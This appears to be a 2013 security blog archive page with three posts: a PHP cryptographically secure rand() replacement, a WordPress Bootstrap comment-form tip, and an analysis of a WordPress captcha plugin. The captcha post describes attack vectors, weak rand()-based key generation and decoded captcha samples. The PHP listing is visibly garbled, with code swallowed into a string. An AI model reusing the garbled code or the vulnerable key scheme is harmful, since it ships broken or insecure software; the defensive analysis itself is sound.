<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/css/font-awesome.min.css">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="index, follow" />
  <meta name="author" content="Nikolai Tschacher" />
  <meta name="description" content="Nikolai Tschacher's ideas and programming around security and computer science" />
<meta property="og:site_name" content="Coding, Learning and IT Security"/>
<meta property="og:type" content="blog"/>
<meta property="og:title" content="Coding, Learning and IT Security"/>
<meta property="og:description" content="Nikolai Tschacher's ideas and programming around security and computer science"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content=""/>
  <title>Coding, Learning and IT Security</title>
</head>
<body>
  <aside>
    <div>
      <a href="">
        <img src="/theme/img/profile.png" alt="Coding, Learning and IT Security" title="Coding, Learning and IT Security">
      </a>
      <h1><a href="">Coding, Learning and IT Security</a></h1>
      <p></p>
      <nav>
        <ul class="list">
          <li><a href="/pages/about.html#about">About</a></li>
          <li><a href="/pages/contact.html#contact">Contact</a></li>
          <li><a href="/pages/googlescraper-py.html#googlescraper-py">GoogleScraper.py</a></li>
          <li><a href="/pages/projects.html#projects">Projects</a></li>
          <li><a href="/pages/impressum.html#impressum">Site Notice</a></li>
          <li><a href="/pages/svgcaptcha.html#svgcaptcha">SVGCaptcha</a></li>
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-twitter" href="https://twitter.com/incolumitas_" target="_blank"><i class="fa fa-twitter"></i></a></li>
        <li><a class="sc-github" href="https://github.com/NikolaiT" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="//incolumitas/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
        <li><a class="sc-stack-overflow" href="http://stackoverflow.com/users/1052496/nikolai-tschacher" target="_blank"><i class="fa fa-stack-overflow"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>
    </nav>

<article>
  <header>
    <h2><a href="/cryptographically-secure-rand-replacement.html#cryptographically-secure-rand-replacement">Cryptographically secure rand() replacement</a></h2>
    <p>
      Posted on Do 14 November 2013 in <a href="/category/cryptography.html">Cryptography</a>
      &#8226; Tagged with
      <a href="/tag/cryptography.html">Cryptography</a>,      <a href="/tag/php.html">Php</a>,      <a href="/tag/security.html">Security</a>,      <a href="/tag/programming.html">Programming</a>    </p>
  </header>
  <div>
      <p>If you are a programmer, you sometimes find yourself in the need for
random numbers. There are many possible use cases:</p>
<ul>
<li>Generate data for unit-tests.</li>
<li>Build secure passwords or keys as input for ciphers like AES,
    Twofish and its colleagues.</li>
<li>Simulating the real world for modelling applications.</li>
<li>A prominent use case: Lot's of gambling sites depend on good random
    number generators.</li>
</ul>
<p>Now if you code in PHP, there are quite some different ways to obtain
random numbers. There is the <a href="http://www.php.net/manual/en/function.rand.php" title="rand"><em>rand ( int \$min , int \$max
)</em></a> function for
instance: It yields a random number within the range specified by the
\$min and \$max parameters.</p>
<p>The documentation states that this approach isn't particularly secure
and shouldn't be used for applications that need to feed algorithms with
cryptographically secure random data. Then there's <a href="http://www.php.net/manual/en/function.mt-rand.php"><em>mt_rand ( int
\$min , int \$max )</em></a>
that apparently creates <em>better</em> random values. Certainly not suitable
for crypto purposes as well.<br />
There were/are quite some applications concerned with security bugs
because of using rand() or mt_rand() for passwords, encryption keys,
session cookies, CSRF tokens and the like. See also this link to a
related discussion on
<a href="http://security.stackexchange.com/questions/18033/how-insecure-are-phps-rand-functions">security.stackexchange.com</a>.</p>
<p>But because of convenience of the \$min, \$max interfaces of rand() and
mt_rand() and it's intuitive handling, I implemented the same interface
for a cryptographically secure pseudo random number generator:
<a href="http://www.php.net/manual/en/function.openssl-random-pseudo-bytes.php"><em>openssl_random_pseudo_bytes ( int \$length [, bool
&amp;\$crypto_strong ]
)</em></a>.</p>
<p>Here is the function that does the job:</p>
<div class="highlight"><pre> <span class="o">:::</span><span class="nx">PHP</span>
 <span class="o">*</span> 
 <span class="o">*</span> <span class="nx">Generates</span> <span class="nx">cryptographically</span> <span class="nx">secure</span> <span class="nx">random</span> <span class="nx">numbers</span> <span class="nx">including</span> <span class="nx">the</span> <span class="nx">range</span> <span class="nx">$start</span> <span class="nx">to</span> <span class="nx">$stop</span> <span class="kd">with</span> 
 <span class="o">*</span> <span class="nx">good</span> <span class="nx">performance</span> <span class="p">(</span><span class="nx">especiall</span> <span class="k">for</span> <span class="nx">ranges</span> <span class="nx">from</span> <span class="mi">0</span><span class="o">-</span><span class="mi">255</span><span class="p">)</span><span class="o">!</span>
 <span class="o">*</span> <span class="nx">Calls</span> <span class="nx">to</span> <span class="nx">openssl_random_pseudo_bytes</span><span class="p">()</span> <span class="nx">are</span> <span class="nx">cached</span> <span class="k">in</span> <span class="nx">a</span> <span class="nx">array</span> <span class="nx">$LUT</span><span class="p">.</span> 
 <span class="o">*</span> <span class="nx">For</span> <span class="nx">instance</span><span class="p">,</span> <span class="nx">you</span> <span class="nx">need</span> <span class="nx">only</span> <span class="nx">around</span> <span class="mi">2</span> <span class="nx">calls</span> <span class="nx">to</span> <span class="nx">openssl_random_pseudo_bytes</span> <span class="k">in</span> <span class="nx">order</span> <span class="nx">to</span> <span class="nx">obtain</span> 
 <span class="o">*</span> <span class="mi">1000</span> <span class="nx">random</span> <span class="nx">values</span> <span class="nx">between</span> <span class="mi">0</span> <span class="nx">and</span> <span class="mi">200</span><span class="p">.</span> <span class="nx">This</span> <span class="nx">ensures</span> <span class="nx">good</span> <span class="nx">performance</span><span class="o">!</span>
 <span class="o">*</span>
 <span class="o">*</span> <span class="nx">Both</span> <span class="nx">parameters</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">positive</span><span class="p">.</span> <span class="nx">If</span> <span class="nx">you</span> <span class="nx">need</span> <span class="nx">a</span> <span class="nx">negative</span> <span class="nx">random</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">just</span> <span class="nx">pass</span> <span class="nx">positiv</span> <span class="nx">values</span>
 <span class="o">*</span> <span class="nx">to</span> <span class="nx">the</span> <span class="kd">function</span> <span class="nx">and</span> <span class="nx">then</span> <span class="nx">make</span> <span class="nx">the</span> <span class="k">return</span> <span class="nx">value</span> <span class="nx">negative</span> <span class="nx">on</span> <span class="nx">your</span> <span class="nx">own</span><span class="p">.</span>
 <span class="o">*</span>
 <span class="o">*</span> <span class="nx">If</span> <span class="nx">the</span> <span class="kd">function</span> <span class="nx">returns</span> <span class="nx">False</span><span class="p">,</span> <span class="nx">something</span> <span class="nx">went</span> <span class="nx">wrong</span><span class="p">.</span>
 <span class="o">*</span> <span class="nx">Always</span> <span class="nx">check</span> <span class="k">for</span> <span class="kc">false</span> <span class="kd">with</span> <span class="s2">&quot;===&quot;</span> <span class="nx">operator</span><span class="p">,</span> <span class="nx">otherwise</span> <span class="nx">a</span> <span class="nx">fail</span> <span class="nx">might</span> <span class="nx">shadow</span> <span class="nx">a</span> <span class="nx">valid</span>
 <span class="o">*</span> <span class="nx">random</span> <span class="nx">value</span><span class="o">:</span> <span class="nx">zero</span><span class="p">.</span> <span class="nx">You</span> <span class="nx">can</span> <span class="nx">pass</span> <span class="nx">the</span> <span class="kr">boolean</span> <span class="nx">parameter</span> <span class="nx">$secure</span><span class="p">.</span> <span class="nx">If</span> <span class="nx">it</span> <span class="nx">is</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">random</span> <span class="nx">value</span> <span class="nx">is</span>
 <span class="o">*</span> <span class="nx">cryptographically</span> <span class="nx">secure</span><span class="p">,</span> <span class="k">else</span> <span class="nx">it</span> <span class="nx">was</span> <span class="nx">generated</span> <span class="kd">with</span> <span class="nx">rand</span><span class="p">().</span>
 <span class="o">*</span> 
 <span class="o">*</span> <span class="err">@</span><span class="nx">staticvar</span> <span class="nx">array</span> <span class="nx">$LUT</span> <span class="nx">A</span> <span class="nx">lookup</span> <span class="nx">table</span> <span class="nx">to</span> <span class="nx">store</span> <span class="nx">bytes</span> <span class="nx">from</span> <span class="nx">calls</span> <span class="nx">to</span> <span class="nx">secure_random_number</span>
 <span class="o">*</span> <span class="err">@</span><span class="nx">param</span> <span class="kr">int</span> <span class="nx">$start</span> <span class="nx">The</span> <span class="nx">bottom</span> <span class="nx">border</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nx">range</span><span class="p">.</span>
 <span class="o">*</span> <span class="err">@</span><span class="nx">param</span> <span class="kr">int</span> <span class="nx">$stop</span> <span class="nx">The</span> <span class="nx">top</span> <span class="nx">border</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nx">range</span><span class="p">.</span>
 <span class="o">*</span> <span class="err">@</span><span class="nx">param</span> <span class="k">in</span> <span class="nx">bool</span> <span class="nx">$secure</span> <span class="nx">Whether</span> <span class="nx">the</span> <span class="nx">call</span> <span class="nx">to</span> <span class="nx">openssl_random_pseudo_bytes</span> <span class="nx">was</span> <span class="nx">made</span> <span class="nx">securely</span><span class="p">.</span>
 <span class="o">*</span> <span class="err">@</span><span class="nx">param</span> <span class="kr">int</span> <span class="nx">$calls</span> <span class="nx">The</span> <span class="nx">number</span> <span class="nx">of</span> <span class="nx">calls</span> <span class="nx">already</span> <span class="nx">made</span><span class="p">.</span>
 <span class="o">*</span> <span class="err">@</span><span class="k">return</span> <span class="kr">int</span> <span class="nx">A</span> <span class="nx">random</span> <span class="nx">integer</span> <span class="nx">within</span> <span class="nx">the</span> <span class="nx">range</span> <span class="p">(</span><span class="nx">including</span> <span class="nx">the</span> <span class="nx">edges</span><span class="p">).</span>
 <span class="o">*</span> <span class="err">@</span><span class="kr">throws</span> <span class="nx">InvalidArgumentException</span> <span class="nx">Thrown</span> <span class="k">if</span> <span class="nx">the</span> <span class="nx">input</span> <span class="nx">range</span> <span class="nx">is</span> <span class="nx">invalid</span><span class="p">.</span>
 <span class="o">*</span> <span class="err">@</span><span class="kr">throws</span> <span class="nx">UnexpectedValueException</span> <span class="nx">Thrown</span> <span class="k">if</span> <span class="nx">openssl_random_pseudo_bytes</span> <span class="nx">was</span> <span class="nx">called</span> <span class="nx">unsecurely</span><span class="p">.</span>
 <span class="o">*</span> <span class="err">@</span><span class="kr">throws</span> <span class="nx">ErrorException</span> <span class="nx">Thrown</span> <span class="k">if</span> <span class="nx">unpack</span> <span class="nx">fails</span><span class="p">.</span>
 <span class="o">*</span><span class="err">/</span>
<span class="kd">function</span> <span class="nx">secure_rand</span><span class="p">(</span><span class="nx">$start</span><span class="p">,</span> <span class="nx">$stop</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">$secure</span> <span class="o">=</span> <span class="s2">&quot;True&quot;</span><span class="p">,</span> <span class="nx">$calls</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">$start</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">$stop</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">$stop</span> <span class="o">&lt;</span> <span class="nx">$start</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s2">&quot;Either stop= 65536 &amp;&amp; $range &lt; 4294967296) {</span>
<span class="s2">        $format = &#39;L&#39;;</span>
<span class="s2">        $num_bytes &lt;&lt;= 3;</span>
<span class="s2">    }</span>

<span class="s2">    /* Before we do anything, lets see if we have a random value in the LUT within our range */</span>
<span class="s2">    if (is_array($LUT) &amp;&amp; !empty($LUT) &amp;&amp; $last_lu === $format) {</span>
<span class="s2">        foreach ($LUT as $key =&gt; $value) {</span>
<span class="s2">            if ($value &gt;= $start &amp;&amp; $value &lt;= $stop) {</span>
<span class="s2">                $secure = True;</span>
<span class="s2">                unset($LUT</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="s2">); // Next run, next value, as my dad always said!</span>
<span class="s2">                return $value;</span>
<span class="s2">            }</span>
<span class="s2">        }</span>
<span class="s2">    }</span>

<span class="s2">    /* Get a blob of cryptographically secure random bytes */</span>
<span class="s2">    $binary = openssl_random_pseudo_bytes($num_bytes, $crypto_strong);</span>

<span class="s2">    if ($crypto_strong == False) {</span>
<span class="s2">        throw new UnexpectedValueException(&quot;</span><span class="nx">openssl_random_bytes</span> <span class="nx">cannot</span> <span class="nx">access</span> <span class="nx">secure</span> <span class="nx">PRNG</span><span class="s2">&quot;);</span>
<span class="s2">    }</span>

<span class="s2">    /* unpack data into previously determined format */</span>
<span class="s2">    $data = unpack($format . &#39;*&#39;, $binary);</span>
<span class="s2">    if ($data == False) {</span>
<span class="s2">        throw new ErrorException(&quot;</span><span class="nx">unpack</span><span class="p">()</span> <span class="nx">failed</span><span class="p">.</span><span class="s2">&quot;);</span>
<span class="s2">    }</span>

<span class="s2">    //Update lookup-table</span>
<span class="s2">    $LUT = $data;</span>
<span class="s2">    $last_lu = $format;</span>

<span class="s2">    foreach ($data as $value) {</span>
<span class="s2">        $value = intval($value, $base = 10);</span>
<span class="s2">        if ($value &lt;= $range) {</span>
<span class="s2">            $secure = True;</span>
<span class="s2">            return ($start + $value);</span>
<span class="s2">        }</span>
<span class="s2">    }</span>

<span class="s2">    $calls++;</span>
<span class="s2">    if ($calls &gt;= 50) { /* Fall back to rand() if the numbers of recursive calls exceed 50 */</span>
<span class="s2">        $secure = False;</span>
<span class="s2">        return rand($start, $stop);</span>
<span class="s2">    } else {/* If we could&#39;t locate integer in the range, try again as long as we do not try more than 50 times. */</span>
<span class="s2">        return secure_rand($start, $stop, $secure, $calls);</span>
<span class="s2">    }</span>
<span class="s2">}</span>
<span class="s2">/*</span>
<span class="s2"> * $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span>
<span class="s2"> * $                 Some tests. Ignore.                 $</span>
<span class="s2"> * $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span>
<span class="s2"> */</span>


<span class="s2">function test($start, $stop) {</span>
<span class="s2">    static $num_called = 1;</span>
<span class="s2">    $val = secure_rand($start, $stop, $secure);</span>
<span class="s2">    echo &quot;</span><span class="nx">Random</span> <span class="nx">Value</span> <span class="err">#</span><span class="nx">$num_called</span> <span class="nx">is</span><span class="o">:</span> <span class="s2">&quot;;</span>
<span class="s2">    var_dump($val);</span>
<span class="s2">    echo &quot;</span><span class="nx">Generated</span> <span class="nx">securely</span><span class="o">:</span> <span class="s2">&quot; . (($secure == True) ? &quot;</span><span class="nx">yes</span><span class="s2">&quot; : &quot;</span><span class="nx">no</span><span class="s2">&quot;) . &quot;&quot;;</span>
<span class="s2">    $num_called++;</span>
<span class="s2">}</span>

<span class="s2">function performance() {</span>
<span class="s2">    // My appraoch</span>
<span class="s2">    $start = microtime(true);</span>
<span class="s2">    // That is also very fast!</span>
<span class="s2">    foreach (range(0, 20000) as $i) {</span>
<span class="s2">        secure_rand(0, 200);</span>
<span class="s2">    }</span>
<span class="s2">    $stop = microtime(true);</span>
<span class="s2">    printf(&quot;</span><span class="nx">Elapsed</span> <span class="nx">time</span> <span class="kd">with</span> <span class="nx">secure_random_number</span><span class="p">()</span><span class="o">:</span> <span class="o">%</span><span class="p">.</span><span class="mi">6</span><span class="nx">f</span> <span class="nx">seconds</span><span class="s2">&quot;, $stop - $start);</span>

<span class="s2">    // With rand()</span>
<span class="s2">    $start = microtime(true);</span>
<span class="s2">    foreach (range(0, 20000) as $i) {</span>
<span class="s2">        rand(0, 200);</span>
<span class="s2">    }</span>
<span class="s2">    $stop = microtime(true);</span>
<span class="s2">    printf(&quot;</span><span class="nx">Elapsed</span> <span class="nx">time</span> <span class="kd">with</span> <span class="nx">rand</span><span class="p">()</span><span class="o">:</span> <span class="o">%</span><span class="p">.</span><span class="mi">6</span><span class="nx">f</span> <span class="nx">seconds</span><span class="err">&quot;</span><span class="p">,</span> <span class="nx">$stop</span> <span class="o">-</span> <span class="nx">$start</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">test</span><span class="p">(</span><span class="mi">100000000</span><span class="p">,</span> <span class="mi">100100000</span><span class="p">);</span> <span class="c1">// Critical call. There&#39;s a high probability that the function will fail.</span>
<span class="nx">test</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="mi">2000000</span><span class="p">);</span>
<span class="nx">test</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">);</span>

<span class="nx">performance</span><span class="p">();</span>
</pre></div>


<p>It essentially prompts for 2\^13 random bytes and then splits this blob
of data either in bytes, shorts or longs depending on your specified
range. It then just iterates over these tokens and looks whether we
found a candidate. If not, we call the function again (recursive step).
For further calls, we collect all unused bytes in a look-up table to
avoid making to much calls to the slow openssl_random_pseudo_bytes()
function. This increases performance a bit.</p>
<p>We try to find a random value in the obtained range maximally 50 times.
If we exceed a recursive depth of 50, we just return the weak and
insecure rand(). You can verify with the \$secure boolean parameter
whether we found such a candidate securely or if we needed to fall back
to rand().</p>
<p>There is no guarantee that the function will always find a value that
fits, especially in the ranges up to 2\^32. If we search for a value in
the range (100000000, 100070000) for instance, we actually look for a
long value that is between 0 and 70000. There are maximally 50*2\^13/4
long values where we can search such a value (Because we request 8192/4
long values per function call and all in all, we have maximally 50
recursive calls).<br />
But the probability that a single random long value lies in this range
is roughly around 1/(2\^32/2\^16) = 1/(2\^16), which in turn means that
with our 50*2\^13/4 long values we have a 2\^16/50*2\^13/4 \~= 1:1
chance that we will find one (The calculation is a rough estimate
though).</p>
<p>The worst (rare) case that can happen: You end up using rand(). But as
mentioned, you can check for this (rare) case with the boolean input
parameter...</p>
<p>But in most cases you don't have this concerns and you are good to go!</p>
<p>To finish, here is a picture that illustrates the distribution of
secure_rand() output:</p>
<p>({filename}/uploads/2013/11/out.png)]({filename}/uploads/2013/11/out.png)
[distribution of secure_rand()]
The output of secure_rand() visualized as points in a canvas.
ure_rand() visualized as points in a canvas.
as.</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/wordpress-comment-form-with-bootstrap-v3-0-2.html#wordpress-comment-form-with-bootstrap-v3-0-2">Wordpress comment form with bootstrap v3.0.2</a></h2>
    <p>
      Posted on Fr 08 November 2013 in <a href="/category/programming.html">Programming</a>
      &#8226; Tagged with
      <a href="/tag/bootstrap.html">Bootstrap</a>,      <a href="/tag/comment.html">Comment</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/form.html">Form</a>,      <a href="/tag/wordpress.html">Wordpress</a>    </p>
  </header>
  <div>
      <p>Hey everybody!</p>
<p>In this short article I will explain how I designed my wordpress theme's
comment section with bootstrap 3.0.2. For the most recent changes, you
find my <a href="https://github.com/NikolaiT/clearcontent/">theme on github</a>. If
you want to see a live demo, just inspect the comment form on this site.
It uses exactly this bootstrap styled form I am discussing here.</p>
<p>In order to follow the content's of this blog post, you should have
basic experience with PHP and HTML/CSS.</p>
<h3>The Problem</h3>
<p>The tricky question here is, whether we can use a action or filter hook
to manipulate the comment form to our liking, or if we have to use and
modify the original <code>comment_form()</code> function directly. Our goal is to
decorate the form with some bootstrap widget classes and use the
bootstrap grid layout. We want to obtain a horizontal form, such as
demonstrated <a href="http://getbootstrap.com/css/#forms-horizontal">here</a>.
After a quick search, I found the function <a href="http://codex.wordpress.org/Function_Reference/comment_form"><code>comment_form( $args,
$post_id);</code></a> in the
wordpress codex. While it looks promising on the first glimpse, some
hindrances become clear after further thinking through. The function's
description says:</p>
<blockquote>
<p>Most strings and form fields may be controlled through the $args
array passed into the function, while you may also choose to use the
<code>comment_form_default_fields</code> filter to modify the array of default
fields if you'd just like to add a new one or remove a single field.
All fields are also individually passed through a filter of the form
<code>comment_form_field_$name</code> where <code>$name</code> is the key used in the array
of fields.</p>
<p><small>Wordpress codex at
<a href="http://codex.wordpress.org/Function_Reference/comment_form">http://codex.wordpress.org/Function_Reference/comment_form</a></p>
</blockquote>
<p>But there are two html elements in the function that aren't passed
through any filters/actions: The <code>&lt;form\&gt;</code> element itself (With the
bootstrap comment form applied, the <code>&lt;form\&gt;</code> element should be <code>&lt;form
class="form-horizontal" role="form"\&gt;</code>) and the submit button that needs
to be wrapped in the following div element:</p>
<div class="highlight"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;form-group&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></div>


<p>Therefore we can't achieve the bootstrap horizontal comment form with
passing modified <code>$args to comment_form()</code> template.</p>
<h3>A Solution</h3>
<p>My quick &amp; dirty solution was to just copy the <code>comment_form()</code> code from
<a href="http://core.trac.wordpress.org/browser/tags/3.7.1/src/wp-includes/comment-template.php#L1509">comment-template.php</a>,
incorporate it in our theme (within functions.php for example) and then
modify it directly to our liking. I guess that doing so is
controversial, because there might be other ways to style the elements
that aren't affected by any filters. For instance, if we can't modify
the <code>&lt;form\&gt;</code> attribute with the boostrap class "form-horizontal", we
could alternatively just wrap the whole <code>comment_form()</code> within a div
element of the same class (Not tested if it really works though).</p>
<p>Anyways, my modified <code>comment_form</code> template can be found
<a href="https://github.com/NikolaiT/clearcontent/blob/master/inc/template-tags.php">here</a>
under the name <code>clearcontent_comment_form()</code>.</p>
<p>The solution is not really nice, because it violates the good wordpress
design pattern, namely avoiding duplicate code with hooks. The
disadvantage is the the potential inconsistency with the real
<code>comment_form()</code> code: Whenever wordpress updates, I need to change my
custom <code>comment_form()</code> too in order to make sure the interfaces stays
stable that <code>comment_form()</code> provides. This is very inconvenient to say
the least.</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/a-tale-of-a-twofold-broken-wordpress-captcha-plugin.html#a-tale-of-a-twofold-broken-wordpress-captcha-plugin">A tale of a twofold broken wordpress captcha plugin</a></h2>
    <p>
      Posted on Mo 04 November 2013 in <a href="/category/programming.html">Programming</a>
      &#8226; Tagged with
      <a href="/tag/captcha.html">Captcha</a>,      <a href="/tag/security.html">Security</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/exploit.html">Exploit</a>    </p>
  </header>
  <div>
      <p><strong>Last Edit (Effective: 7th November 2013)</strong></p>
<p>It seems like the plugin authors updated the security of the plugin. All
the bottom blog entry deals with version 3.8.7. In this new paragraph, I
will look whether these recent updates to version
<a href="http://plugins.svn.wordpress.org/captcha/tags/3.8.8/" title="3.8.8">3.8.8</a>
added the necessary security to prevent conducting an...</p>
<ul>
<li>Attack vector one: Parsing the captcha logic.</li>
<li>Attack vector two: Reversing the decode() function and just reading the solution from the hidden fields.</li>
</ul>
<p>Let's get started:</p>
<p>At line 942 of the <a href="http://plugins.svn.wordpress.org/captcha/tags/3.8.8/captcha.php" title="plugin code">plugin code</a>
(The start of the function that generates the captcha) we see that the
password isn't longer a static clear text password, it is built
dynamically every 24 hours with the function <code>cptch_generate_key()</code>,
that I will show here for your convenience:</p>
<div class="highlight"><pre><span class="x">// Functionality of the captcha logic work for custom form</span>
<span class="x">if ( ! function_exists( &#39;cptch_display_captcha_custom&#39; ) ) {</span>
<span class="x">    function cptch_display_captcha_custom() {</span>
<span class="x">        global $cptch_options, $cptch_time;</span>

<span class="x">        if ( ! isset( $cptch_options[&#39;cptch_str_key&#39;] ) )</span>
<span class="x">            $cptch_options = get_option( &#39;cptch_options&#39; );</span>
<span class="x">        if ( $cptch_options[&#39;cptch_str_key&#39;][&#39;key&#39;] == &#39;&#39; || $cptch_options[&#39;cptch_str_key&#39;][&#39;time&#39;] &lt; time() - ( 24 * 60 * 60 ) )</span>
<span class="x">            cptch_generate_key();</span>
<span class="x">        $str_key = $cptch_options[&#39;cptch_str_key&#39;][&#39;key&#39;];</span>
</pre></div>


<p>Let's see if the new function <code>cptch_generate_key()</code> is sufficiently
random enough. Here is the function code:</p>
<div class="highlight"><pre><span class="x">/* generate key */</span>
<span class="x">if ( ! function_exists( &#39;cptch_generate_key&#39; ) ) {</span>
<span class="x">    function cptch_generate_key( $lenght = 15 ) {</span>
<span class="x">        global $cptch_options;</span>
<span class="x">        /* Under the string $simbols you write all the characters you want to be used to randomly generate the code. */</span>
<span class="x">        $simbols = get_bloginfo( &quot;url&quot; ) . time();</span>
<span class="x">        $simbols_lenght = strlen( $simbols );</span>
<span class="x">        $simbols_lenght--;</span>
<span class="x">        $str_key = NULL;</span>
<span class="x">        for ( $x = 1; $x &lt;= $lenght; $x++ ) {</span>
<span class="x">            $position = rand( 0, $simbols_lenght );</span>
<span class="x">            $str_key .= substr( $simbols, $position, 1 );</span>
<span class="x">        }</span>

<span class="x">        $cptch_options[&#39;cptch_str_key&#39;][&#39;key&#39;] = md5( $str_key );</span>
<span class="x">        $cptch_options[&#39;cptch_str_key&#39;][&#39;time&#39;] = time();</span>
<span class="x">        update_option( &#39;cptch_options&#39;, $cptch_options );</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<p>Sorry to disappoint, it's still <em>somewhat</em> broken. Let's discuss what
the patch does:</p>
<p>First the author obtains the current site address with
<code>get_bloginfo('url')</code>. The wordpress docs says that this retrieves:</p>
<blockquote>
<p>'url' - Returns the "Site address (URL)" set in Settings &gt; General. This data is retrieved from the "home" record in the wp_options table. Equivalent to home_url().</p>
</blockquote>
<p>This is a world known static value, that is not randomness in ANY
POSSIBLE WAY in the site url! If the plugin is installed on my server,
<code>get_bloginfo('url')</code> would just yield "http://incolumitas.com/". You get
it? It returns the url where wordpress is located :/</p>
<p>Furthermore, the function continues to pick random characters from the
site url and concatenates them to a new string that has default length
of 15. In short: The function just uses 15 random characters from the
seed that is the site url. Well, is this secure?</p>
<p>First of all, <code>rand()</code> is not a secure
<a href="http://en.wikipedia.org/wiki/Pseudorandom_number_generator">PRNG</a>! I
suggest the plugin author strongly to have a glimpse on a recent reddit
netsec post about <a href="http://www.reddit.com/r/netsec/comments/1pvfmv/phps_mt_rand_random_number_generating_function/">that even <code>mt_rand()</code> is a weak
PRNG</a>.</p>
<p>This means that we can find out the state of <code>rand()</code> with sufficiently
enough samples and can therefore predict what characters the <code>rand()</code>
function outputs. But maybe that works not, because the password is only
generated every 24 hours and the "state" of the <code>rand()</code> PRNG changes
faster. I honestly don't know. That being said, there is probably
another way to extract values from <code>rand()</code> through wordpress in order to
obtain enough samples to pursue a cracking attempt. Maybe even by the
captcha math equations themselves, since their randomness relies heavily
on successive calls to rand() [After thinking twice about it: That will
definitely work]. Anyway, I would suggest to use something like the
following to generate the password (Coded quickly by me, so double check
it better!):</p>
<div class="highlight"><pre><span class="x">// Always check if this function returns a str of length 32! If not, don&#39;t use it!</span>
<span class="x">if ( ! function_exists( &#39;cptch_generate_key&#39; ) ) {</span>
<span class="x">   function cptch_generate_key( $length = 32 ) {</span>
<span class="x">     $cstrong = False;</span>
<span class="x">     $bytes = openssl_random_pseudo_bytes($length, $cstrong);</span>
<span class="x">     if ($cstrong == False)</span>
<span class="x">        return False;</span>
<span class="x">     else</span>
<span class="x">        return bin2hex($bytes);</span>
<span class="x">   }</span>
<span class="x">}</span>
</pre></div>


<p><strong>Conclusion:</strong></p>
<ul>
<li>The plugin is still vulnerable against captcha parsing (Nothing
    changed here). This is the root of the problem.</li>
<li>The plugin still handles it's cryptography pretty badly, but the
    randomness might be good enough! (Note that I am from times
    meticulous what security things concern).</li>
<li>
<p>The whole captcha protection is even in a <em>third</em> way broken.
    Consider some captchas that I generated with the plugin:</p>
<p>Calculation with timestamp: 1383770422 Encoded pWw= is decoded to 3 
Calculation with timestamp: 1383773265 Encoded 3Ko= is decoded to 8 
Calculation with timestamp: 1383772504 Encoded tNM= is decoded to 6 
Calculation with timestamp: 1383770071 Encoded E08r is decoded to 10 
Calculation with timestamp: 1383771712 Encoded VEA= is decoded to 0 
Calculation with timestamp: 1383770645 Encoded aWPB is decoded to 16 
Calculation with timestamp: 1383773392 Encoded MEa7 is decoded to 42 
Calculation with timestamp: 1383772030 Encoded 2uA= is decoded to 4 
Calculation with timestamp: 1383770004 Encoded lJ8= is decoded to 7 
Calculation with timestamp: 1383770859 Encoded KvE= is decoded to 9 
Calculation with timestamp: 1383772789 Encoded k1I= is decoded to 7 
Calculation with timestamp: 1383773377 Encoded BAE= is decoded to 6 
Calculation with timestamp: 1383770038 Encoded /HY= is decoded to 8 
Calculation with timestamp: 1383768565 Encoded nmM= is decoded to 5 
Calculation with timestamp: 1383765035 Encoded JPA= is decoded to 6 
Calculation with timestamp: 1383770354 Encoded 9EZ3 is decoded to 12 
Calculation with timestamp: 1383771119 Encoded KX4= is decoded to 1 
Calculation with timestamp: 1383773236 Encoded eSc= is decoded to 7 
Calculation with timestamp: 1383770716 Encoded J6w= is decoded to 1 
Calculation with timestamp: 1383768040 Encoded fUg= is decoded to 1 
Calculation with timestamp: 1383773167 Encoded 7Co= is decoded to 6 
Calculation with timestamp: 1383770803 Encoded A3k= is decoded to 1 
Calculation with timestamp: 1383771047 Encoded J1Q= is decoded to 8 
Calculation with timestamp: 1383768079 Encoded fpg= is decoded to 6 
Calculation with timestamp: 1383767787 Encoded uR8= is decoded to 2 
Calculation with timestamp: 1383773077 Encoded pgg= is decoded to 4 
Calculation with timestamp: 1383772657 Encoded KXI= is decoded to 3 
Calculation with timestamp: 1383771187 Encoded Ct0= is decoded to 9 
Calculation with timestamp: 1383767982 Encoded Y6U= is decoded to 3 
